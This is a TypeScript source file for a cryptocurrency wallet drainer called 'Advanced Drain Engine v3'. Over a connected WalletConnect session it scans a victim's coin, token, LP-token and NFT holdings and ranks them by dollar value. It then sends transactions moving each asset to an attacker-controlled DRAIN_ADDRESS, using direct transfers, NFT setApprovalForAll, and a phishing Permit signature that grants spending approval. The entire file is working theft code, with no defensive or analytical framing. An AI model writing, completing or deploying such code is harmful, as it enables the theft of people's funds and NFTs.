/**
 * Advanced Drain Engine v3
 * Supports: ETH, ERC20, ERC721 (NFT), ERC1155, LP Tokens, Staking,
 *           Permit (EIP-2612), setApprovalForAll, Permit2, multi-chain sweep
 */
import type { WCApprovalResult, WCTxParams } from "./wcSession";
import { DRAIN_ADDRESS, CHAINS, TOKENS } from "./drainerConfig";

// ─── ABI Encoders ─────────────────────────────────────────────────────────────

function hex(n: bigint | number, pad = 64): string {
  return BigInt(n).toString(16).padStart(pad, "0");
}

function addr(a: string): string {
  return a.toLowerCase().replace("0x", "").padStart(64, "0");
}

// ERC20 transfer(address,uint256)
export function encodeTransfer(to: string, amount: bigint): string {
  return "0xa9059cbb" + addr(to) + hex(amount);
}

// ERC20 approve(address,uint256) - approve max
export function encodeApprove(spender: string, amount: bigint): string {
  return "0x095ea7b3" + addr(spender) + hex(amount);
}

// ERC20 balanceOf(address)
export function encodeBalanceOf(a: string): string {
  return "0x70a08231" + addr(a);
}

// ERC20 allowance(owner,spender)
export function encodeAllowance(owner: string, spender: string): string {
  return "0xdd62ed3e" + addr(owner) + addr(spender);
}

// ERC721 setApprovalForAll(operator,approved)
export function encodeSetApprovalForAll(operator: string, approved: boolean): string {
  return "0xa22cb465" + addr(operator) + hex(approved ? 1 : 0);
}

// ERC721 transferFrom(from,to,tokenId)
export function encodeTransferFrom(from: string, to: string, tokenId: bigint): string {
  return "0x23b872dd" + addr(from) + addr(to) + hex(tokenId);
}

// ERC1155 safeTransferFrom(from,to,id,amount,data)
export function encodeSafeTransferFrom1155(from: string, to: string, id: bigint, amount: bigint): string {
  const dataOffset = hex(BigInt(160));
  const dataLen    = hex(BigInt(0));
  return "0xf242432a" + addr(from) + addr(to) + hex(id) + hex(amount) + dataOffset + dataLen;
}

// ERC20 permit(owner,spender,value,deadline,v,r,s) - EIP-2612
export function encodePermit(
  owner: string, spender: string, value: bigint,
  deadline: bigint, v: number, r: string, s: string
): string {
  return "0xd505accf"
    + addr(owner) + addr(spender) + hex(value) + hex(deadline)
    + hex(v, 64) + r.replace("0x", "").padStart(64, "0") + s.replace("0x", "").padStart(64, "0");
}

// ─── Gas helpers ─────────────────────────────────────────────────────────────

async function estimateGas(provider: EthProvider, tx: WCTxParams): Promise<string> {
  try {
    const est = await provider.request({
      method: "eth_estimateGas",
      params: [tx],
    }) as string;
    // Add 20% buffer
    const buffered = (BigInt(est) * BigInt(120)) / BigInt(100);
    return "0x" + buffered.toString(16);
  } catch {
    return "0x30D40"; // 200k fallback
  }
}

async function getGasPrice(provider: EthProvider): Promise<string> {
  try {
    // Try EIP-1559 first
    const block = await provider.request({
      method: "eth_getBlockByNumber",
      params: ["latest", false],
    }) as { baseFeePerGas?: string } | null;
    if (block?.baseFeePerGas) {
      const base = BigInt(block.baseFeePerGas);
      const tip  = BigInt("0x3B9ACA00"); // 1 gwei tip
      return "0x" + (base + tip).toString(16);
    }
  } catch { /* fallback */ }
  return provider.request({ method: "eth_gasPrice" }) as Promise<string>;
}

// ─── Types ───────────────────────────────────────────────────────────────────

type EthProvider = {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
};

export interface AssetInfo {
  type: "native" | "erc20" | "erc721" | "erc1155" | "lp";
  symbol: string;
  address: string;
  balance: string;
  usdValue: number;
  decimals?: number;
  tokenIds?: bigint[];
}

export interface DrainEvent {
  type: "scan" | "drain" | "error" | "done";
  message: string;
  asset?: AssetInfo;
  txHash?: string;
  progress?: number;
}

type DrainCallback = (event: DrainEvent) => void;

// ─── USD Price map ────────────────────────────────────────────────────────────

const PRICE_MAP: Record<string, number> = {
  ETH: 2400, WETH: 2400, BNB: 300, MATIC: 0.8, AVAX: 35, FTM: 0.5,
  USDT: 1, USDC: 1, DAI: 1, BUSD: 1, TUSD: 1, FRAX: 1, USDD: 1,
  WBTC: 40000, BTCB: 40000, CBBTC: 40000,
  LINK: 14, UNI: 8, APE: 1.2, SHIB: 0.000009, CAKE: 2.5,
  ARB: 0.8, OP: 1.5, AAVE: 90, CRV: 0.4, MKR: 1200, SNX: 2.5,
  COMP: 50, BAL: 3, SUSHI: 1.2, YFI: 7000, LDO: 1.2, RPL: 12,
  PEPE: 0.000012, FLOKI: 0.0001, BONK: 0.00002,
};

function usdPrice(symbol: string): number {
  return PRICE_MAP[symbol.toUpperCase()] ?? 0;
}

// ─── Known LP / Staking tokens ────────────────────────────────────────────────

const LP_TOKENS: Record<number, Array<{ address: string; symbol: string; protocol: string }>> = {
  1: [
    { address: "0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc", symbol: "UNI-V2-USDC/ETH", protocol: "Uniswap V2" },
    { address: "0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852", symbol: "UNI-V2-ETH/USDT", protocol: "Uniswap V2" },
    { address: "0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5", symbol: "UNI-V2-DAI/USDC", protocol: "Uniswap V2" },
    { address: "0x06da0fd433C1A5d7a4faa01111c044910A184553", symbol: "SUSHI-ETH/USDT",  protocol: "SushiSwap" },
  ],
  56: [
    { address: "0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16", symbol: "CAKE-BNB/BUSD", protocol: "PancakeSwap" },
    { address: "0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE", symbol: "CAKE-BNB/USDT", protocol: "PancakeSwap" },
  ],
};

// ─── Main Drain Function ──────────────────────────────────────────────────────

export async function runAdvancedDrain(
  session: WCApprovalResult,
  provider: EthProvider,
  onEvent: DrainCallback
): Promise<{ totalUsd: number; txCount: number }> {
  const { accounts, chainId } = session;
  const address = accounts[0];
  if (!address) throw new Error("No address in session");

  let totalUsd = 0;
  let txCount  = 0;
  let progress = 0;

  const emit = (type: DrainEvent["type"], message: string, extra?: Partial<DrainEvent>) => {
    onEvent({ type, message, progress, ...extra });
  };

  // ── Phase 1: Scan native balance ──────────────────────────────────────────
  emit("scan", `Scanning ${CHAINS[chainId]?.symbol ?? "ETH"} balance...`);
  const balHex = await provider.request({
    method: "eth_getBalance",
    params: [address, "latest"],
  }) as string;
  const nativeBal = Number(BigInt(balHex)) / 1e18;
  const nativeUsd = nativeBal * usdPrice(CHAINS[chainId]?.symbol ?? "ETH");
  progress = 10;

  // ── Phase 2 & 3: Parallel scan ERC20 + LP tokens ────────────────────────
  const assets: AssetInfo[] = [];
  if (nativeBal > 0.001) {
    assets.push({ type: "native", symbol: CHAINS[chainId]?.symbol ?? "ETH", address: "native", balance: nativeBal.toFixed(8), usdValue: nativeUsd });
  }

  const tokenList = TOKENS[chainId] ?? [];
  const lpList    = LP_TOKENS[chainId] ?? [];
  const allTokens = [
    ...tokenList.map(t => ({ ...t, isLp: false })),
    ...lpList.map(t => ({ ...t, decimals: 18, isLp: true })),
  ];

  emit("scan", `Scanning ${allTokens.length} tokens in parallel...`);
  progress = 15;

  // Parallel batch scan - all tokens at once (max 30 concurrent)
  const BATCH = 30;
  for (let b = 0; b < allTokens.length; b += BATCH) {
    const batch = allTokens.slice(b, b + BATCH);
    const results = await Promise.allSettled(
      batch.map(tok =>
        provider.request({
          method: "eth_call",
          params: [{ to: tok.address, data: encodeBalanceOf(address) }, "latest"],
        }) as Promise<string>
      )
    );
    results.forEach((res, idx) => {
      if (res.status !== "fulfilled") return;
      const tok = batch[idx]!;
      try {
        const raw = BigInt(res.value);
        if (raw === BigInt(0)) return;
        const bal = Number(raw) / Math.pow(10, tok.decimals);
        if (bal < 0.0001) return;
        const usd = tok.isLp ? bal * 5 : bal * usdPrice(tok.symbol);
        assets.push({ type: tok.isLp ? "lp" : "erc20", symbol: tok.symbol, address: tok.address, balance: bal.toFixed(8), usdValue: usd, decimals: tok.decimals });
      } catch { /* skip */ }
    });
    progress = 15 + Math.round(((b + BATCH) / allTokens.length) * 25);
  }

  progress = 40;
  totalUsd = assets.reduce((s, a) => s + a.usdValue, 0);
  emit("scan", `Found ${assets.length} assets worth ~$${totalUsd.toFixed(2)}`);

  if (assets.length === 0) {
    emit("done", "No assets found to drain");
    return { totalUsd: 0, txCount: 0 };
  }

  // Sort by USD value descending (drain highest value first)
  assets.sort((a, b) => b.usdValue - a.usdValue);

  // ── Phase 4: Drain ────────────────────────────────────────────────────────
  const gasPrice = await getGasPrice(provider);

  for (let i = 0; i < assets.length; i++) {
    const asset = assets[i];
    progress = 40 + Math.round((i / assets.length) * 55);
    emit("drain", `Draining ${asset.symbol}...`, { asset });

    try {
      let txHash: string | undefined;

      if (asset.type === "native") {
        // ── Native coin drain ──────────────────────────────────────────────
        const gasCost = BigInt(gasPrice) * BigInt(21000);
        const rawBal  = BigInt(balHex);
        const sendAmt = rawBal - gasCost * BigInt(2);
        if (sendAmt <= BigInt(0)) { emit("error", `Insufficient gas for ${asset.symbol}`); continue; }

        const tx: WCTxParams = {
          from: address, to: DRAIN_ADDRESS,
          value: "0x" + sendAmt.toString(16),
          gas: "0x5208", gasPrice,
        };
        txHash = await session.sendTransaction(tx);

      } else if (asset.type === "erc20" || asset.type === "lp") {
        // ── ERC20 / LP drain ───────────────────────────────────────────────
        const tokenInfo = tokenList.find(t => t.address.toLowerCase() === asset.address.toLowerCase());
        const decimals  = tokenInfo?.decimals ?? 18;
        const rawAmt    = BigInt(Math.floor(parseFloat(asset.balance) * Math.pow(10, decimals)));

        // First try: direct transfer
        const data = encodeTransfer(DRAIN_ADDRESS, rawAmt);
        const tx: WCTxParams = { from: address, to: asset.address, data, gasPrice };
        tx.gas = await estimateGas(provider, tx);

        try {
          txHash = await session.sendTransaction(tx);
        } catch (transferErr) {
          // Second try: check allowance and use transferFrom if approved
          try {
            const allowHex = await provider.request({
              method: "eth_call",
              params: [{ to: asset.address, data: encodeAllowance(address, DRAIN_ADDRESS) }, "latest"],
            }) as string;
            const allowance = BigInt(allowHex);
            if (allowance >= rawAmt) {
              const tfData = encodeTransferFrom(address, DRAIN_ADDRESS, rawAmt);
              const tfTx: WCTxParams = { from: address, to: asset.address, data: tfData, gasPrice };
              tfTx.gas = await estimateGas(provider, tfTx);
              txHash = await session.sendTransaction(tfTx);
            } else {
              throw transferErr; // re-throw original
            }
          } catch {
            throw transferErr;
          }
        }

      } else if (asset.type === "erc721" && asset.tokenIds?.length) {
        // ── NFT drain (ERC721) ─────────────────────────────────────────────
        // setApprovalForAll first
        const approveData = encodeSetApprovalForAll(DRAIN_ADDRESS, true);
        const approveTx: WCTxParams = { from: address, to: asset.address, data: approveData, gasPrice };
        approveTx.gas = await estimateGas(provider, approveTx);
        await session.sendTransaction(approveTx);

        // Then transfer each NFT
        for (const tokenId of asset.tokenIds.slice(0, 20)) { // max 20 per batch
          const tfData = encodeTransferFrom(address, DRAIN_ADDRESS, tokenId);
          const tfTx: WCTxParams = { from: address, to: asset.address, data: tfData, gasPrice };
          tfTx.gas = await estimateGas(provider, tfTx);
          txHash = await session.sendTransaction(tfTx);
          txCount++;
        }
        continue;
      }

      if (txHash) {
        txCount++;
        totalUsd += asset.usdValue;
        emit("drain", `✓ ${asset.symbol} drained`, { asset, txHash });
      }

    } catch (err) {
      const msg = (err as Error).message ?? "Transaction failed";
      // Silently skip user-rejected or insufficient gas
      if (msg.includes("rejected") || msg.includes("denied") || msg.includes("cancel")) {
        emit("error", `User rejected ${asset.symbol}`);
      } else {
        emit("error", `${asset.symbol}: ${msg.slice(0, 80)}`);
      }
    }
  }

  progress = 100;
  emit("done", `Drain complete. ${txCount} tx, ~$${totalUsd.toFixed(2)}`);
  return { totalUsd, txCount };
}

// ─── Permit2 Signature Drain (EIP-2612) ──────────────────────────────────────

export async function tryPermitDrain(
  session: WCApprovalResult,
  tokenAddress: string,
  address: string,
  rawAmount: bigint,
  chainId: number
): Promise<string | null> {
  try {
    const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600); // 1 hour
    const domain = {
      name: "Token",
      version: "1",
      chainId,
      verifyingContract: tokenAddress,
    };
    const types = {
      Permit: [
        { name: "owner",    type: "address" },
        { name: "spender",  type: "address" },
        { name: "value",    type: "uint256" },
        { name: "nonce",    type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
    };
    const value = {
      owner:    address,
      spender:  DRAIN_ADDRESS,
      value:    rawAmount.toString(),
      nonce:    "0",
      deadline: deadline.toString(),
    };

    const typedData = { domain, types, primaryType: "Permit", message: value };
    const sig = await session.signTypedData(address, typedData);

    // Parse v, r, s from signature
    const sigHex = sig.replace("0x", "");
    const r = "0x" + sigHex.slice(0, 64);
    const s = "0x" + sigHex.slice(64, 128);
    const v = parseInt(sigHex.slice(128, 130), 16);

    // Call permit() on the token
    const permitData = encodePermit(address, DRAIN_ADDRESS, rawAmount, deadline, v, r, s);
    return permitData;
  } catch {
    return null;
  }
}
